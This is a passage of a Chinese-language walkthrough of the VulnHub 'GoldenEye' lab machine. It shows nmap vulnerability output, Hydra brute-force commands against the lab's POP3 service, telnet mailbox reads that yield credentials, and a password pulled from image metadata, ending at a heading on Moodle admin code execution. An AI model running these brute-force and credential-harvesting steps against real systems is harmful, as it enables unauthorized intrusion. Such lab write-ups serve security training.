class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="built_in">groups</span></span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared <span class="built_in">groups</span>, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="built_in">groups</span></span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared <span class="built_in">groups</span>, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>
+
+<p>是时候深入挖掘了！在页面的HTML源代码中，找出了负责漂亮的首页动画的JavaScript文件。在terminal.js上，我找到了第一个提示。用于以HTML编码编码的boris的硬编码密码，这对于解码非常简单。我获得了访问该应用程序的凭据。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub133.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub134.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub135.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="comment">#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line">InvincibleHack3r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到账号密码：boris&#x2F;InvincibleHack3r，然后登录</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub136.jpg"></p>
+<p>访问该应用程序没有任何用处。尝试使用相同的凭据访问pop3服务，并检查了鲍里斯经纪人是否有任何有趣的电子邮件。但是，获得的密码不适合用于pop3访问。老实说，在这里停留了一段时间。<br>没有其他线索，对使用用户名boris的pop3服务进行了快速的暴力破解。Hydra能够使用Kali中存在的fasttrack.txt单词列表来破解密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:37:45</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[STATUS] 100.00 tries/min, 100 tries <span class="keyword">in</span> 00:01h, 122 to <span class="keyword">do</span> <span class="keyword">in</span> 00:02h, 20 active</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!</span><br><span class="line">[STATUS] 111.00 tries/min, 222 tries <span class="keyword">in</span> 00:02h, 1 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 19 active</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:39:45</span><br></pre></td></tr></table></figure>
+
+<p>得到boris&#x2F;secret1!，然后telnet连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass secret1!</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>
+
+<p>电子邮件通讯的内容不可直接利用，但能够找出执行任务的其他特工的用户名。这也可以用于对其他代理发起相同的攻击。很幸运找到了natalya。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:46:23</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: natalya   password: bird</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:46:39</span><br></pre></td></tr></table></figure>
+
+<p>natalya&#x2F;bird，登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP <span class="built_in">id</span> D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>将关键信息retr 2翻译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">好的，娜塔琳，我为你准备了一个新学生。由于这是一个新系统，请让我或鲍里斯知道您是否发现任何配置问题，尤其是它与安全性有关……即使不是与安全有关，也可以以“安全性”为名输入它……无需太多麻烦就可以将变更单升级：)</span><br><span class="line">好的，用户凭证是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez!</span><br><span class="line"></span><br><span class="line">鲍里斯（Boris）确认她是有效承包商，所以只需创建帐户就可以了吗？如果您没有外部内部域上的URL，请访问：severnaya-station.com/gnocertdir</span><br><span class="line"></span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程网络外工作。由于您是Linux用户，只需将此服务器IP指向/etc/hosts中的severnaya-station.com。</span><br></pre></td></tr></table></figure>
+
+<p>修改hosts文件将ip:192.168.56.101指向severnaya-station.com，然后访问域名severnaya-station.com&#x2F;gnocertdir</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub137.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub138.jpg"></p>
+<p>现在，我可以浏览到severnaya-station.com&#x2F;gnocertdir以xenia的形式访问培训门户。学习门户使用开源学习平台Moodle托管。无法从门户访问任何课程资料或附件。但是，来自GoldenEye项目主管的Doak博士发了言。他在消息中说，他的电子邮件用户名不正确。我在pop3服务上使用hydra尝试了攻击。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub139.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 22:21:03</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: doak   password: goat</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 22:21:32</span><br></pre></td></tr></table></figure>
+
+<p>doak&#x2F;goat,</p>
+<p>那是特勤人员可以使用的最愚蠢的密码！不过，我可以使用新发现的凭据访问电子邮件通信。通过电子邮件通信，我发现了以代理Doak身份访问moodle的凭据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>
+
+<p>username: dr_doak<br>password: 4England!</p>
+<p>我在Doak博士的帐户中发现了一个有趣的附件，该附件说可以从&#x2F;dir007key&#x2F;for-007.jpg获取应用程序的管理员凭据。使用隐写术，可以将秘密消息嵌入图像中。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub140.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/007.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool 007.jpg </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : 007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure>
+
+<p>将Image Description的base64字符串解码得到:xWinter1995x!</p>
+<p>然后使用admin&#x2F;xWinter1995x!登录即可</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub141.jpg"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
+<li>moodle管理员账户远程代码执行</li>
+</ul>
